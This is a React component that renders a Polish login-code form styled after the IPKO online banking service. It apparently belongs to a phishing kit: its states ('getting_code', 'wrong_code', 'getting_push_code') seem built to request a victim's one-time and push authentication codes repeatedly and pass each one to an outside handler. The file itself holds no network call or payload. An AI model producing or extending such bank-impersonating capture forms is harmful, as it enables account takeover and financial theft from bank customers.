import React, {Fragment, useState} from "react";
import {Button, Form, FormGroup, Input} from "reactstrap";
import {yupResolver} from '@hookform/resolvers/yup';
import * as yup from "yup";
import {useForm} from "react-hook-form";


const schema = yup.object().shape({
    code: yup.string().min(3).required(),
});


const IpkoFormCode = ({status, handler}) => {
    const [edit, setEdit] = useState(false);
    const {register, handleSubmit, reset, formState} = useForm({
        resolver: yupResolver(schema),
        mode: 'onChange'
    });

    const editing = () => {
        console.log('edit')
        if (!edit) {
            setEdit(true);
        }
    }
    const clearCode = (data) => {
        console.log('Send code')
        setEdit(false);
        reset();
        handler(data.code);
    }

    return (
        <Fragment>
            {
                status === 'getting_code' || status === 'wrong_code' || status === 'getting_push_code' || status === 'wrong_push_code' ?
                    <Form key={3} className={'ipko_form'} onSubmit={handleSubmit(clearCode)}>
                        <div className="ipko_form_header">
                            <h2>Zaloguj się</h2>
                        </div>
                        <FormGroup key={'code'} className={edit ? 'edit' : status === 'wrong_code' || status === 'wrong_push_code' ? 'error' : null}>
                            <Input {...register('code')}
                                   onChange={editing}
                                   placeholder={'Wpisz kod'}
                                   className={formState.errors.code && 'error'}/>
                            {
                                status === 'wrong_code' || status === 'wrong_push_code' ?
                                    <div className="error_message">
                                        Błędny kod
                                    </div> : null
                            }

                            <div className="btn_container">
                                <a href="#">Pomoc w logowaniu</a>
                                <Button className={'next'}
                                        type={'submit'}
                                >
                                    Posłać
                                </Button>
                            </div>
                        </FormGroup>
                    </Form> :
                    null
            }

        </Fragment>
    )
}
export default IpkoFormCode;